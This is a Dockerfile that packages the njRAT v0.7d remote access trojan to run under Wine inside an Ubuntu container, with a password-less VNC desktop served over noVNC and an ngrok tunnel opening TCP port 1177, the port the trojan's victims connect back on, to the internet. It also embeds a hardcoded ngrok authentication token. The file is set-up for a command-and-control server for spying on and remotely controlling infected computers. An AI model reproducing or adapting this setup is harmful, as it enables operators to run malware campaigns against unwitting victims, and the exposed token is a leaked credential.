FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN dpkg --add-architecture i386 && \
    apt-get update && apt-get install -y \
    xvfb \
    x11vnc \
    novnc \
    websockify \
    fluxbox \
    wine32 \
    wine64 \
    winetricks \
    curl \
    gnupg \
    && rm -rf /var/lib/apt/lists/*

RUN curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | gpg --dearmor -o /etc/apt/keyrings/ngrok.gpg && \
    echo "deb [signed-by=/etc/apt/keyrings/ngrok.gpg] https://ngrok-agent.s3.amazonaws.com buster main" | tee /etc/apt/sources.list.d/ngrok.list && \
    apt-get update && apt-get install -y ngrok

WORKDIR /app

COPY njRAT_v0.7d.exe /app/app.exe

EXPOSE 10000

RUN echo '#!/bin/bash
Xvfb :1 -screen 0 1024x768x16 &
export DISPLAY=:1
sleep 3
fluxbox &
sleep 1
x11vnc -forever -shared -nopw -display :1 -rfbport 5900 -bg -o /app/x11vnc.log
sleep 2
ngrok config add-authtoken Cr_3GGdkvG7pObxEzyudWvsReOI1J4
ngrok tcp 1177 &
winetricks -q dotnet40 2>&1 > /app/winetricks.log &
wine /app/app.exe 2>&1 > /app/wine.log &
websockify --web /usr/share/novnc/ 10000 localhost:5900
' > /app/start.sh && chmod +x /app/start.sh

CMD ["/app/start.sh"]
